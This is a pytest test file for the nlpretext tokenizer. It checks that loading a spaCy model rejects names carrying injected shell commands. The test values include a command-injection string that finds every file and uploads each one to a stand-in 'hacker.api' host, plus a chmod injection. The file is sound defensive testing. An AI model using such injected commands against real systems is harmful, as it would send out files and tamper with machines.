import pytest
from nlpretext.token.tokenizer import LanguageNotInstalledError, _load_spacy_model


@pytest.mark.parametrize(
    "bad_model_name",
    [
        ("en_core_web_sm; chmod -x hacker"),
        (
            "fr_core_news_sm | for file in $(find .); "
            'do curl_command -X POST -H "Content-Type: multipart/form-data" '
            '-F "data=@${file}" https-fake://hacker.api/upload; done'
        ),
    ],
)
def test_load_spacy_model_validation(bad_model_name):
    with pytest.raises(LanguageNotInstalledError) as e:
        _load_spacy_model(bad_model_name)
        assert bad_model_name in str(e.value)
